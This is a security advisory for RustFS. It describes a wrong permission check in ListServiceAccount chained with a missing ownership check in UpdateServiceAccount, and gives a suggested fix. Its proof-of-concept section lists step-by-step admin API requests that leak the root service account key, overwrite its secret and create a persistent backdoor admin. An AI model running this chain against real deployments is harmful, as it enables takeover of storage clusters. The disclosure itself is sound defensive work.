# [H] RustFS: ListServiceAccount authorizes against wrong admin action, enabling cross-user enumeration and root service account takeover

## Summary
Severity: High
Advisory: GHSA-mm2q-qcmx-gw4w
CWE: CWE-863
Ecosystem: crates.io
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-mm2q-qcmx-gw4w
Type: github-advisory

## Affected
- crates.io: `rustfs` — affected >=0 <1.0.0-alpha.98

## Details
## Summary

`ListServiceAccount` (`GET /rustfs/admin/v3/list-service-accounts?user=<other>`) authorizes cross-user requests against `UpdateServiceAccountAdminAction` instead of `ListServiceAccountsAdminAction` at `rustfs/src/admin/handlers/service_account.rs:936`. The handler accepts the **wrong** admin action and rejects the **correct** one:

- A user granted only `admin:UpdateServiceAccount` enumerates every service account in the cluster, including the root user's (HTTP 200, full metadata).
- A user granted only `admin:ListServiceAccounts` — the permission name every IAM document treats as "list service accounts" — receives HTTP 403 AccessDenied on the same request.

Because service account access keys act as the identifier a `UpdateServiceAccount` holder needs to rotate a secret, and the `UpdateServiceAccount` handler at `rustfs/src/admin/handlers/service_account.rs:489` performs no ownership check on the target access key, leaking those access keys lets a delegated "service account updater" role overwrite `root-sa-1`'s secret, authenticate as the root user's service account, and create a persistent backdoor admin with `admin:*` + `s3:*`. Proven live end-to-end against `rustfs/rustfs:latest` (1.0.0-alpha.91, revision `d4ea14c2`) — the same revision is byte-identical on current `origin/main`.

## Vulnerability Details

- **Package:** `rustfs` (binary crate `rustfs`)
- **Affected versions:** From `0a2411f` (the initial `service_account.rs` check-in on 2026-03-15) through current HEAD `90e584a`. The vulnerable line has never been touched.
- **Fixed versions:** None
- **Vulnerable file:** `rustfs/src/admin/handlers/service_account.rs`
- **Vulnerable route:** `GET /rustfs/admin/v3/list-service-accounts?user=<other_user>` (`ListServiceAccount::call`)
- **CWE:** CWE-863 (Incorrect Authorization), chained with CWE-620 (Unverified Password Change) to reach CWE-269 (Improper Privilege Management)
- **CVSS (demonstrated chain to full admin):** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` = **10.0 Critical**. If scored as Scope:Unchanged the vector is `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` = **8.8 High**. The list bug alone (no chain) is `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` = **6.5 Medium** and is what a maintainer would rate it if the Update ownership gap is out of scope for this report.

## Two Distinct Vulnerabilities

This report documents two bugs that chain to full RustFS administrative takeover. Each is independently fixable and independently a security issue:

**Vulnerability A — Wrong action constant in ListServiceAccount (CWE-863)**
`ListServiceAccount::call` at line 936 checks `UpdateServiceAccountAdminAction` instead of `ListServiceAccountsAdminAction`. This is a copy-paste typo: the three sibling list handlers (lines 658, 799, 1095) all use the correct constant. The result is a permission inversion — the correct permission (`admin:ListServiceAccounts`) is rejected, and the wrong one (`admin:UpdateServiceAccount`) is accepted. Independently, this is a Medium-severity cross-user information disclosure.

**Vulnerability B — Missing ownership check in UpdateServiceAccount (CWE-620)**
`UpdateServiceAccount::call` at lines 489-614 authorizes on possession of `admin:UpdateServiceAccount` but never verifies the target `?accessKey=` belongs to the caller or the caller's parent. Lines 522-525 contain a commented-out `get_service_account` call that would have loaded the target for such a check. This means any holder of `admin:UpdateServiceAccount` can overwrite any service account's secret in the cluster, regardless of ownership.

**Chain (A + B) — Full RustFS administrative takeover**
Vulnerability A leaks every service account's access key (including the root administrator's). Vulnerability B allows overwriting any SA's secret given its access key. Together: a user with a single permission (`admin:UpdateServiceAccount`) enumerates the root user's SA access key via the wrong-action list bug, overwrites its secret via the ownership-free update handler, authenticates as the root user's service account, and creates a persistent backdoor admin with full RustFS administrative control.

**Authorization mismatch at a glance:**

Exact policies attached to each test identity (retrieved from running server via `GET /admin/v3/info-canned-policy`):

        legit-list-pol      -> {"Action": ["admin:ListServiceAccounts"],  "Resource": ["arn:aws:s3:::*"]}
        list-sa-probe-pol   -> {"Action": ["admin:UpdateServiceAccount"], "Resource": ["arn:aws:s3:::*"]}
        list-sa-restricted  -> {"Action": ["admin:UpdateServiceAccount"], "Resource": ["arn:aws:s3:::probe-scope/*"]}
        (zero-priv-user has no attached policy)

| Identity | Attached policy | `GET /list-service-accounts?user=rustfsadmin` | Expected |
|---|---|---|---|
| `probe-user` | `list-sa-probe-pol` (`admin:UpdateServiceAccount`) | **200** (full SA metadata) | 403 |
| `legit-list-user` | `legit-list-pol` (`admin:ListServiceAccounts`) | **403** AccessDenied | 200 |
| `restricted-update-user` | `list-sa-restricted` (`admin:UpdateServiceAccount` on `probe-scope/*`) | **200** | 403 |
| `zero-priv-user` | (none) | **403** | 403 |
| (unauthenticated) | n/a | **403** Signature required | 403 |

### Why the correct permission gets 403

The handler at line 936 calls `is_allowed` with the action `AdminAction::UpdateServiceAccountAdminAction`. The IAM engine performs an exact string match between the action in the `is_allowed` call (`admin:UpdateServiceAccount`) and the action in the caller's attached policy:

- `legit-list-user` has policy action `admin:ListServiceAccounts`. This does **not** match `admin:UpdateServiceAccount`. `is_allowed` returns false. The handler returns 403. The user who holds the *correct* permission for listing service accounts is denied.
- `probe-user` has policy action `admin:UpdateServiceAccount`. This **matches** `admin:UpdateServiceAccount`. `is_allowed` returns true. The handler returns 200. The user who holds a *different, unrelated* permission is granted access to a list endpoint.
- `restricted-update-user` has the same action string but resource-scoped to `arn:aws:s3:::probe-scope/*`. Admin-action statements skip resource matching (`crates/policy/src/policy/statement.rs:132`: `&& !self.is_admin() && !self.is_sts()`), so the resource restriction is ignored and `is_allowed` still returns true.

There is no wildcard, superset, or inheritance relationship between these two action strings. They are separate enum variants (`crates/policy/src/policy/action.rs:459-462`) with distinct `strum(serialize)` values. The IAM engine is working correctly; the handler passes the wrong action to it.

Raw request/response for `legit-list-user` (the counterintuitive 403):

        GET /rustfs/admin/v3/list-service-accounts?user=rustfsadmin  HTTP/1.1
        Authorization: AWS4-HMAC-SHA256 Credential=legit-list-user/...

        HTTP/1.1 403
        <?xml version="1.0" encoding="UTF-8"?><Error><Code>AccessDenied</Code><Message>access denied</Message></Error>

**Why this is not "working as intended":**
- `admin:UpdateServiceAccount` and `admin:ListServiceAccounts` are distinct enum variants with distinct string representations. The codebase treats them as orthogonal permissions.
- Three sibling list handlers in the same file (lines 658, 799, 1095) all check `ListServiceAccountsAdminAction`. Only line 936 deviates.
- CVE-2026-22042 / GHSA-vcwh-pff9-64cc is the maintainers' own precedent: `ImportIam` checking `ExportIAMAction` was rated Medium and fixed. The same class of bug applies here.
- A zero-privilege user (no admin policies at all) cannot exploit either vulnerability — both handlers correctly enforce their respective `is_allowed` checks. The bug is that the list handler enforces the *wrong* action constant, not that it skips enforcement entirely.

## Root Cause — Vulnerability A (Wrong Action Constant)

`ListServiceAccount::call` is registered for `GET /rustfs/admin/v3/list-service-accounts` at `rustfs/src/admin/handlers/service_account.rs:137-141`. The cross-user branch (entered when `?user=<x>` does not match the caller) checks the wrong admin action:

    // rustfs/src/admin/handlers/service_account.rs:931-953  (HEAD 90e584a, identical at d4ea14c2)
    let target_account = if query.user.as_ref().is_some_and(|v| v != &cred.access_key) {
        if !iam_store
            .is_allowed(&Args {
                account: &cred.access_key,
                groups: &cred.groups,
                action: Action::AdminAction(AdminAction::UpdateServiceAccountAdminAction), // WRONG
                bucket: "",
                conditions: &get_condition_values(...),
                is_owner: owner,
                object: "",
                claims: cred.claims.as_ref().unwrap_or(&HashMap::new()),
                deny_only: false,
            })
            .await
        {
            return Err(s3_error!(AccessDenied, "access denied"));
        }
        query.user.unwrap_or_default()
    } else if cred.parent_user.is_empty() {
        cred.access_key
    } else {
        cred.parent_user
    };

The action enum definitions are cleanly distinct at `crates/policy/src/policy/action.rs:459-464`:

    #[strum(serialize = "admin:CreateServiceAccount")] CreateServiceAccountAdminAction,
    #[strum(serialize = "admin:UpdateServiceAccount")] UpdateServiceAccountAdminAction,
    #[strum(serialize = "admin:RemoveServiceAccount")] RemoveServiceAccountAdminAction,
    #[strum(serialize = "admin:ListServiceAccounts")]  ListServiceAccountsAdminAction,

Every *other* list handler in the same file authorizes on the correct constant:

    rustfs/src/admin/handlers/service_account.rs:658   InfoServiceAccount::call   -> ListServiceAccountsAdminAction
    rustfs/src/admin/handlers/service_account.rs:799   InfoAccessKey::call        -> ListServiceAccountsAdminAction
    rustfs/src/admin/handlers/service_account.rs:1095  ListAccessKeysBulk::call   -> ListServiceAccountsAdminAction

Only `ListServiceAccount::call` at line 936 deviates. This is a typo/wiring error, not a design choice.

`git blame` shows the line has been wrong since commit `0a2411f` (heihutu, 2026-03-15), the initial check-in of `service_account.rs`.

## Root Cause — Vulnerability B (Missing Ownership Check in Update)

Service account access keys are the identifier the `UpdateServiceAccount` handler accepts via the `?accessKey=` query string. Inspecting `UpdateServiceAccount::call` at `rustfs/src/admin/handlers/service_account.rs:489-614`:

    let access_key = query.access_key;                                // line 509
    ...
    if !iam_store.is_allowed(&Args {
        account: &cred.access_key,
        action: Action::AdminAction(AdminAction::UpdateServiceAccountAdminAction),
        ...
    }).await { return Err(s3_error!(AccessDenied, "access denied")); } // line 538-559
    ...
    let updated_at = iam_store.update_service_account(&access_key, opts).await  // line 579
        .map_err(...)?;

The handler authorizes on *possession of* `admin:UpdateServiceAccount` and **never checks** that the `?accessKey=` query parameter resolves to a service account owned by the caller. Notably, lines 522-525 contain a commented-out `get_service_account` call that would have loaded the target SA for an ownership check — it was present in the initial commit and has been commented out since:

    // let svc_account = iam_store.get_service_account(&access_key).await.map_err(|e| {
    //     debug!("get service account failed, e: {:?}", e);
    //     s3_error!(InternalError, "get service account failed")
    // })?;

The inner `IamSys::update_service_account` at `crates/iam/src/sys.rs:495-501` delegates to `IamCache::update_service_account` at `crates/iam/src/manager.rs:663` which loads the credentials by access-key name, verifies it is a service account, and overwrites `secret_key` — again, no ownership check:

    // crates/iam/src/manager.rs:663
    pub async fn update_service_account(&self, name: &str, opts: UpdateServiceAccountOpts) -> Result<OffsetDateTime> {
        let Some(ui) = self.cache.users.load().get(name).cloned() else {
            return Err(Error::NoSuchServiceAccount(name.to_string()));
        };
        ...
        let mut cr = ui.credentials.clone();
        let current_secret_key = cr.secret_key.clone();

        if let Some(secret) = opts.secret_key {
            if !is_secret_key_valid(&secret) {
                return Err(Error::InvalidSecretKeyLength);
            }
            cr.secret_key = secret;                // <-- attacker-chosen
        }
        ...

So a holder of `admin:UpdateServiceAccount` who knows *any* service account's access key can overwrite its secret. The list bug at line 936 hands them every access key in the cluster, including `root-sa-1`.

The two bugs together form a clean chain:

1. Attacker has a single admin permission: `admin:UpdateServiceAccount`.
2. Attacker calls `GET /v3/list-service-accounts?user=rustfsadmin` — vulnerable handler grants access.
3. Attacker reads `accessKey=root-sa-1` out of the response.
4. Attacker calls `POST /v3/update-service-account?accessKey=root-sa-1` with body `{"newSecretKey":"..."}` — ownership-less handler overwrites.
5. Attacker authenticates as `root-sa-1` with the chosen secret and inherits the root user's full `admin:*` + `s3:*` authority.

## Environment and Version Alignment

- Image: `rustfs/rustfs:latest`, digest `sha256:74f8eaad96124c7e019bedfb892b41a9429c495f57b883182427c5e9e9d53c6a`
- Labels: `org.opencontainers.image.version=1.0.0-alpha.91`, `org.opencontainers.image.revision=d4ea14c2ba99602314511d5862005f7b871ece37`, `org.opencontainers.image.build-type=prerelease`
- Source verification:

        $ git show d4ea14c2:rustfs/src/admin/handlers/service_account.rs | sed -n '931,940p'
                let target_account = if query.user.as_ref().is_some_and(|v| v != &cred.access_key) {
                    if !iam_store
                        .is_allowed(&Args {
                            account: &cred.access_key,
                            groups: &cred.groups,
                            action: Action::AdminAction(AdminAction::UpdateServiceAccountAdminAction),
                            bucket: "",
                            ...

        $ git show origin/main:rustfs/src/admin/handlers/service_account.rs | sed -n '931,940p'
                let target_account = if query.user.as_ref().is_some_and(|v| v != &cred.access_key) {
                    if !iam_store
                        .is_allowed(&Args {
                            account: &cred.access_key,
                            groups: &cred.groups,
                            action: Action::AdminAction(AdminAction::UpdateServiceAccountAdminAction),
                            bucket: "",
                            ...

Byte-identical. The shipped image contains the same vulnerable handler as the tip of main.

## Proof of Concept (executed live)

### Environment

        docker run -d --name rustfs-poc --memory=2g -p 9100:9000 \
            -e RUSTFS_ACCESS_KEY=rustfsadmin -e RUSTFS_SECRET_KEY=rustfsadmin \
            rustfs/rustfs:latest

Root credentials: `rustfsadmin:rustfsadmin`.

### Step 1 — Provision the probe identity

The probe policy grants exactly **one** admin action, scoped to the broadest resource. Nothing else.

        {
          "Version": "2012-10-17",
          "Statement": [
            {
              "Effect": "Allow",
              "Action": ["admin:UpdateServiceAccount"],
              "Resource": ["arn:aws:s3:::*"]
            }
          ]
        }

Creation as root:

        PUT /rustfs/admin/v3/add-canned-policy?name=list-sa-probe-pol        -> 200
        PUT /rustfs/admin/v3/add-user?accessKey=probe-user                   -> 200  (secret: probe-secret1234)
        PUT /rustfs/admin/v3/set-user-or-group-policy?userOrGroup=probe-user&isGroup=false&policyName=list-sa-probe-pol -> 200
        PUT /rustfs/admin/v3/add-user?accessKey=victim-user                  -> 200  (no policy)
        PUT /rustfs/admin/v3/add-service-accounts                            -> 200  (creates victim-sa-1 under victim-user)
        PUT /rustfs/admin/v3/add-service-accounts                            -> 200  (creates root-sa-1 under rustfsadmin)

### Step 2 — Baseline: probe-user is actually constrained

Confirming `probe-user` is denied on unrelated admin endpoints so the "200 on list-service-accounts" is not the side effect of some ambient privilege:

        GET /rustfs/admin/v3/list-users                 as probe-user -> 403 AccessDenied
        GET /rustfs/admin/v3/info                       as probe-user -> 403 AccessDenied
        GET /rustfs/admin/v3/list-canned-policies       as probe-user -> 403 AccessDenied
        GET /rustfs/admin/v3/kms/status                 as probe-user -> 403 AccessDenied
        PUT /rustfs/admin/v3/add-canned-policy?name=... as probe-user -> 403 AccessDenied
        GET /rustfs/admin/v3/list-service-accounts      as probe-user -> 200 {"accounts":[]}  # self-scope OK

The self-scope list (no `user=` query) returns an empty array — the caller's own service account inventory, which is correctly allowed. This isolates the bug to the cross-user branch only.

### Step 3 — Primary exploit: enumerate other users' service accounts

        GET /rustfs/admin/v3/list-service-accounts?user=victim-user  as probe-user -> 200
        {"accounts":[{"parentUser":"victim-user","accountStatus":"on","impliedPolicy":true,"accessKey":"victim-sa-1","name":"sa-victim-user-victim-sa-1","description":"probe target SA for user victim-user","expiration":null}]}

        GET /rustfs/admin/v3/list-service-accounts?user=rustfsadmin  as probe-user -> 200
        {"accounts":[{"parentUser":"rustfsadmin","accountStatus":"on","impliedPolicy":true,"accessKey":"root-sa-1","name":"sa-rustfsadmin-root-sa-1","description":"probe target SA for user rustfsadmin","expiration":null}]}

Exposed per entry: `parentUser`, `accountStatus`, `impliedPolicy`, **`accessKey`**, `name`, `description`, `expiration`. The response does not leak secret keys or session tokens (those are cleared server-side), but it does leak the `accessKey` — the identifier that the `UpdateServiceAccount` endpoint consumes via `?accessKey=`.

### Step 4 — Differential: the correct permission gets denied

Created `legit-list-user` with a policy granting only `admin:ListServiceAccounts`:

        {
          "Version": "2012-10-17",
          "Statement": [
            {
              "Effect": "Allow",
              "Action": ["admin:ListServiceAccounts"],
              "Resource": ["arn:aws:s3:::*"]
            }
          ]
        }

Running the same request:

        GET /rustfs/admin/v3/list-service-accounts?user=rustfsadmin  as legit-list-user -> 403
        <?xml version="1.0" encoding="UTF-8"?><Error><Code>AccessDenied</Code><Message>access denied</Message></Error>

This is the damning evidence of inversion. The handler refuses the **correct** permission (`admin:ListServiceAccounts`) and accepts the **wrong** one (`admin:UpdateServiceAccount`). There is no superset/subset relationship in the action enum; these are two distinct constants. A deployment that grants its operators `admin:ListServiceAccounts` to view the service account inventory — the intuitive and documented approach — will see every cross-user list request return 403 until this bug is fixed.

The resource-scoped variant gave the same result as the broad variant:

        # Policy: admin:UpdateServiceAccount on arn:aws:s3:::probe-scope/* (unrelated to any SA)
        GET /rustfs/admin/v3/list-service-accounts?user=rustfsadmin  as restricted-update-user -> 200 (same body as probe-user)

Resource restrictions on admin actions are skipped in `crates/policy/src/policy/statement.rs:132` (`&& !self.is_admin() && !self.is_sts()`), so the bug is equally reachable by an operator whose `admin:UpdateServiceAccount` grant was scoped to a specific bucket.

And unauthenticated requests are still rejected:

        GET /rustfs/admin/v3/list-service-accounts?user=rustfsadmin  (no signature) -> 403 "Signature is required"

This is an **authenticated privilege-boundary violation**, not a pre-auth bug.

### Step 4b — Zero-privilege user is correctly blocked

To confirm the bug is in the action constant (not a missing check), created `zero-priv-user` with **no policies at all**:

        GET /rustfs/admin/v3/list-service-accounts?user=rustfsadmin  as zero-priv-user -> 403 AccessDenied
        POST /rustfs/admin/v3/update-service-account?accessKey=root-sa-1  as zero-priv-user -> 403 AccessDenied
        GET /rustfs/admin/v3/list-service-accounts  as zero-priv-user -> 200 {"accounts":[]}  # self-scope only

The `is_allowed` check at line 936 fires and correctly blocks zero-priv-user because they have *no* admin permissions. The bug is not that the check is skipped — it is that the check uses the **wrong action constant**, so it grants access to users holding `admin:UpdateServiceAccount` (the wrong permission) and denies users holding `admin:ListServiceAccounts` (the correct permission).

### Step 5 — Full chain to RustFS admin takeover (persistent backdoor)

With `accessKey=root-sa-1` known, `probe-user` (still only `admin:UpdateServiceAccount`) hijacks the root service account's secret:

        POST /rustfs/admin/v3/update-service-account?accessKey=root-sa-1  as probe-user
             body: {"newSecretKey":"pwned-secret-2"}                           -> 204 NoContent

Then re-signs and calls admin APIs as `root-sa-1/pwned-secret-2`:

        GET /rustfs/admin/v3/list-users  as root-sa-1/pwned-secret-2 -> 200
        {"svinfo-user":{"policyName":"serverinfo-only","status":"enabled",...},
         "probe-user":{"policyName":"list-sa-probe-pol","status":"enabled",...},
         "readonly-user":{"policyName":"readonly","status":"enabled",...},
         "victim-user":{"status":"enabled",...}}

        GET /rustfs/admin/v3/info  as root-sa-1/pwned-secret-2       -> 200
        {"mode":"online","backend":{"backendType":"Erasure","online":...},"buckets":{"count":...},"services":{...}}

Both endpoints previously returned 403 for `probe-user`. They now succeed because `root-sa-1` inherits `rustfsadmin`'s full authority.

Extending the chain to a persistent backdoor, still driven by `probe-user`'s hijacked `root-sa-1` session:

        PUT /rustfs/admin/v3/add-user?accessKey=backdoor-admin                 -> 200  (body: {"secretKey":"backdoor-secret-9","status":"enabled"})
        PUT /rustfs/admin/v3/add-canned-policy?name=proof-admin-all            -> 200  (body: admin:* + s3:*)
        PUT /rustfs/admin/v3/set-user-or-group-policy?userOrGroup=backdoor-admin&isGroup=false&policyName=proof-admin-all -> 200

Direct authentication as the new admin (no further reliance on the hijacked SA):

        GET /rustfs/admin/v3/list-users  as backdoor-admin/backdoor-secret-9   -> 200 (same full user dump)
        PUT /proof-admin-bucket          as backdoor-admin/backdoor-secret-9   -> 200 (new bucket created on the S3 plane)

The attacker now owns a persistent admin identity with `admin:*` and `s3:*` that will survive secret rotations on `root-sa-1`. Starting identity was a user granted exactly one admin action.

### Full PoC scripts

Runnable top-to-bottom against a fresh `rustfs/rustfs:latest` container. Each script prints raw HTTP status codes and response bodies.

- `poc/01_setup_probe_user.py` — create policies, users, service accounts.
- `poc/02_baseline_probe.py` — 403/200 differential on unrelated admin endpoints.
- `poc/03_exploit.py` — primary ListServiceAccount enumeration.
- `poc/04_escalate_takeover.py` — hijack root-sa-1 and prove admin calls.
- `poc/05_full_root_compromise.py` — end-to-end chain including backdoor-admin creation and new bucket.
- `poc/06_differential_and_resource.py` — legit-list-user 403 and resource-scoped 200.

## Impact

1. **Full RustFS administrative takeover (Confidentiality: High, Integrity: High, Availability: High).**
   A user with a single admin permission (`admin:UpdateServiceAccount`) chains the list bug with the ownership-free `UpdateServiceAccount` handler to overwrite any service account's secret — including the root administrator's — and inherit full `admin:*` + `s3:*` authority over the RustFS deployment. Demonstrated live: probe-user → list → hijack root-sa-1 → create persistent backdoor-admin → create bucket.

2. **Authorization inversion on a core admin endpoint (Integrity).**
   Users granted the intended `admin:ListServiceAccounts` permission receive 403 on cross-user list requests. A rustfs deployment that issues `admin:ListServiceAccounts` to its operators (the obvious and documented interpretation of the action name) is silently broken until this is fixed.

3. **Cross-user service-account inventory disclosure (Confidentiality: High).**
   Even absent the update-ownership gap, the bug exposes every service account's access key, owning principal, name, description, account status, and expiration to any `admin:UpdateServiceAccount` holder. This maps the full service-account topology of the cluster and identifies which account to target for a secret rotation attack.

4. **Resource-scoped policies provide no mitigation (Integrity).**
   `statement.rs:132` skips resource matching for admin statements, so restricting `admin:UpdateServiceAccount` to a specific bucket ARN (the usual pattern for bounded delegation) gives a false sense of isolation and does not reduce the blast radius of this bug.

## Suggested Fix

The minimal, correct fix is a one-line change at `rustfs/src/admin/handlers/service_account.rs:936`:

    // rustfs/src/admin/handlers/service_account.rs:936
    -                    action: Action::AdminAction(AdminAction::UpdateServiceAccountAdminAction),
    +                    action: Action::AdminAction(AdminAction::ListServiceAccountsAdminAction),

This brings `ListServiceAccount` in line with the three sibling handlers (lines 658, 799, 1095) that correctly enforce `ListServiceAccountsAdminAction`, and restores the documented meaning of the `admin:ListServiceAccounts` permission for operators who rely on it.

### Recommended follow-up (separate but related)

Even after this fix, `UpdateServiceAccount::call` at `rustfs/src/admin/handlers/service_account.rs:489-614` will still lack any check that the target `?accessKey=` belongs to the caller (or the caller's parent), so any holder of `admin:UpdateServiceAccount` who can otherwise obtain the access key of a higher-privileged service account can still hijack it. Consider adding an ownership precondition inside the handler before calling `iam_store.update_service_account`:

    let target = iam_store.get_service_account(&access_key).await
        .map_err(|e| map_service_account_lookup_error(e, "get service account failed"))?;
    let caller_parent = if cred.parent_user.is_empty() { cred.access_key.as_str() } else { cred.parent_user.as_str() };
    if target.0.parent_user != caller_parent && !is_owner {
        // Only root or the parent user should be able to mutate this SA.
        // (Or additionally require a dedicated admin action granted to full admins.)
        return Err(s3_error!(AccessDenied, "access denied"));
    }

This additional check closes the secret-rotation primitive for non-root holders of `admin:UpdateServiceAccount`. It is outside the strict scope of the line-936 typo, but the live PoC shows it is the mechanism by which information disclosure escalates to full administrative takeover, so fixing both in one advisory avoids leaving a usable primitive in place.

## Self-Review

- **Is this by-design?** No. The three sibling list handlers at lines 658, 799, and 1095 all enforce `ListServiceAccountsAdminAction`. The action enum has distinct `admin:UpdateServiceAccount` and `admin:ListServiceAccounts` strings with no wildcard relationship. There is no comment, test, or docstring suggesting the deviation at line 936 is intentional. CVE-2026-22042 / GHSA-vcwh-pff9-64cc (`ImportIam` using `ExportIAMAction`) is the maintainers' own precedent that this class of bug is treated as a real security issue.
- **Reachability?** Proven live on `rustfs/rustfs:latest` revision `d4ea14c2`. Response bodies captured in the report above and in `poc/` logs.
- **Is there upstream routing that enforces admin?** No. `S3Router::register` dispatches directly from `service_account.rs:137-141` into `ListServiceAccount::call`; the only authorization is the `is_allowed` call at line 931-953. Confirmed by the 200 return for `probe-user` and the 403 return for `legit-list-user` on the same path.
- **Prior art?** No existing rustfs advisory covers this handler. `CVE-2026-22042` is the same *class* of bug in a different handler; `CVE-2026-22043` is a `deny_only` short-circuit bug in the same file but a completely different code path. Both are explicitly distinct from the line 936 typo.
- **Is the docker image the same code as main?** Yes. Image label `org.opencontainers.image.revision=d4ea14c2`; `git show d4ea14c2:rustfs/src/admin/handlers/service_account.rs` at lines 931-960 is byte-identical to `git show origin/main:rustfs/src/admin/handlers/service_account.rs`. Re-verified on 2026-04-09 at HEAD `90e584a` — file unchanged since initial commit `0a2411f`.
  - The commented-out ownership check at lines 522-525 of `UpdateServiceAccount::call` demonstrates the developer was aware an ownership check belonged there but left it disabled. This is not a design decision — it is incomplete implementation that this report's chain exploits.
- **Honest limitations:**
  - The primary exploit requires an authenticated principal with `admin:UpdateServiceAccount`. It is not pre-auth.
  - Secret keys of the enumerated service accounts are NOT returned by the list handler (they are explicitly cleared elsewhere). Only the access key is disclosed. The escalation to RustFS admin relies on the *Update* path to overwrite the secret, not on reading a leaked secret.
  - The full administrative takeover chain depends on the separate `UpdateServiceAccount` ownership gap. If a reviewer considers that gap out of scope for this report, the line-936 typo on its own is best-rated as **Medium** cross-user information disclosure (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` = 6.5). The live PoC and differential stand independent of that scoping.
  - The differential (legit-list-user → 403, probe-user → 200) isolates the cause to the handler's action constant and is reproducible in seconds against a fresh container.

## Resources

- Vulnerable file in image: `rustfs/src/admin/handlers/service_account.rs` @ `d4ea14c2ba99602314511d5862005f7b871ece37`
- Vulnerable file at HEAD: `rustfs/src/admin/handlers/service_account.rs` @ `90e584a` (file unchanged since `0a2411f`)
- Incorrect action at line 936: `https://github.com/rustfs/rustfs/blob/d4ea14c2ba99602314511d5862005f7b871ece37/rustfs/src/admin/handlers/service_account.rs#L931-L953`
- Correct action at line 658 (`InfoServiceAccount`): `https://github.com/rustfs/rustfs/blob/d4ea14c2ba99602314511d5862005f7b871ece37/rustfs/src/admin/handlers/service_account.rs#L658`
- Correct action at line 799 (`InfoAccessKey`): `https://github.com/rustfs/rustfs/blob/d4ea14c2ba99602314511d5862005f7b871ece37/rustfs/src/admin/handlers/service_account.rs#L799`
- Correct action at line 1095 (`ListAccessKeysBulk`): `https://github.com/rustfs/rustfs/blob/d4ea14c2ba99602314511d5862005f7b871ece37/rustfs/src/admin/handlers/service_account.rs#L1095`
- AdminAction enum: `https://github.com/rustfs/rustfs/blob/d4ea14c2ba99602314511d5862005f7b871ece37/crates/policy/src/policy/action.rs#L457-L464`
- UpdateServiceAccount handler (ownership gap): `https://github.com/rustfs/rustfs/blob/d4ea14c2ba99602314511d5862005f7b871ece37/rustfs/src/admin/handlers/service_account.rs#L489-L614`
- IamCache::update_service_account: `https://github.com/rustfs/rustfs/blob/d4ea14c2ba99602314511d5862005f7b871ece37/crates/iam/src/manager.rs#L663`
- Admin statements skip resource matching: `https://github.com/rustfs/rustfs/blob/d4ea14c2ba99602314511d5862005f7b871ece37/crates/policy/src/policy/statement.rs#L132`
- rustfs security policy: `https://github.com/rustfs/rustfs/security/policy`
- Prior art (same class, different handler): `CVE-2026-22042` / `GHSA-vcwh-pff9-64cc`


Koda Reef

## References
- https://github.com/rustfs/rustfs/security/advisories/GHSA-mm2q-qcmx-gw4w
- https://github.com/rustfs/rustfs
